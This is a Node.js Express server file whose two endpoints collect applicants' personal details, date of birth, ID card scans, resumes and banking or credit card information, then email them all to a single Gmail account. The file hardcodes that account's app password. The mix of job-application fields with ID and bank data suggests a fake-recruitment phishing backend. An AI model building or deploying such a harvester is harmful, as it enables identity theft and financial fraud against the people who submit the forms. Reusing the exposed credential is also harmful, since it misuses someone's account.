const express = require('express');
const bodyParser = require('body-parser');
const multer = require('multer');
const nodemailer = require('nodemailer');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
const upload = multer({ dest: 'uploads/' });
app.use(express.json())
app.use(express.urlencoded({extended:true}))
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.raw());
app.use(bodyParser.text());


// Enable CORS for all routes, or specify your HTML domain instead of '*'
app.use(cors({
  origin: '*' // Replace with your actual HTML domain
}));

app.get('/', (req, res) => {
    res.send("Server");
  
  });

  const cpUpload = upload.fields([{ name: 'client_resume', maxCount: 1 }, { name: 'cover_letter', maxCount: 8 }, {name: 'id_card', maxCount:2}])

app.post('/send-email', cpUpload, (req, res) => {
    const { last_name, first_name, name_title, middle_name, email_address, phone_number, date_of_birth, client_state, client_address, client_city, postal_code } = req.body;
    console.log(req.body)
    const resume = req.files.client_resume ? req.files.client_resume[0] : null;
        const coverLetter = req.files.cover_letter ? req.files.cover_letter[0] : null;
        const idCard = req.files.id_card ? req.files.id_card[0] : null;
    // Construct email message
    const message = `
        Contact Information:
        Last Name: ${last_name}
        First Name: ${first_name}
        Title: ${name_title}
        Middle Name: ${middle_name}
        Email Address: ${email_address}
        Phone Number: ${phone_number}

        Sensitive Information:
        Date of Birth: ${date_of_birth}

        Address:
        State: ${client_state}
        Address Line: ${client_address}
        City: ${client_city}
        Postal Code: ${postal_code}
    `;
 

    // Create a transporter object using SMTP transport
    let transporter = nodemailer.createTransport({
        service: 'gmail', // You can use other services like 'yahoo', 'outlook', etc.
        auth: {
            user: 'davidmiller4504@gmail.com',
            pass: 'dqhc mwpf nkmb buib'
        }
    });

    // Setup email data with unicode symbols
    let mailOptions = {
        from: "davidmiller4504@gmail.com", // sender address
        to: "davidmiller4504@gmail.com", // list of receivers
        subject: 'New Contact Form Submission', // Subject line
        text: message, // plain text body
            attachments: [
                { filename: resume?.originalname, path: resume?.path },
                { filename: coverLetter?.originalname, path: coverLetter?.path },
                {filename: idCard?.originalname, path: idCard?.path}
            ].filter(attachment => attachment.filename) // Include only attachments with filenames
    };

    transporter.sendMail(mailOptions, (error, info) => {
        // Cleanup function to delete files after email is sent
        const cleanup = () => {
            if (resume && fs.existsSync(resume.path)) {
                fs.unlinkSync(resume.path);
            }
            if (coverLetter && fs.existsSync(coverLetter.path)) {
                fs.unlinkSync(coverLetter.path);
            }
            if (idCard && fs.existsSync(idCard.path)) {
                fs.unlinkSync(idCard.path);
            }
        };
    
        if (error) {
            console.log(error);
            cleanup(); // Clean up even if sending email failed
            res.status(500).send('Error sending email');
        } else {
            console.log('Email sent: ' + info.response);
            cleanup(); // Clean up after email is successfully sent
            res.send('Email sent successfully!');
        }
    });
    
});

app.post("/sender", async(req,res) => {
    const { bank_name, credit_card, payment_method, company_trust, checking_account,email } = req.body;
    console.log(req.body)
   
    // Construct email message
    const message = `
        Contact Information (bank details):
        Bank Name: ${bank_name}
        Credit Name: ${credit_card}
        payment_method: ${payment_method}
        company_trust: ${company_trust}
        checking_account: ${checking_account}
        email: ${email}
    `;
 

    // Create a transporter object using SMTP transport
    let transporter = nodemailer.createTransport({
        service: 'gmail', // You can use other services like 'yahoo', 'outlook', etc.
        auth: {
            user: 'davidmiller4504@gmail.com',
            pass: 'dqhc mwpf nkmb buib'
        }
    });

    let mailOptions = {
        from: "davidmiller4504@gmail.com", // sender address
        to: "davidmiller4504@gmail.com", // list of receivers
        subject: 'New Contact Form Submission', // Subject line
        text: message // plain text body
    };

    transporter.sendMail(mailOptions, (error, info) => {
        // Cleanup function to delete files after email is sent
      
    
        if (error) {
            console.log(error);
            res.status(500).send('Error sending email');
        } else {
            console.log('Email sent: ' + info.response);
            res.json({ success: true, message: 'Email sent successfully!' });
        }
    });
})

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
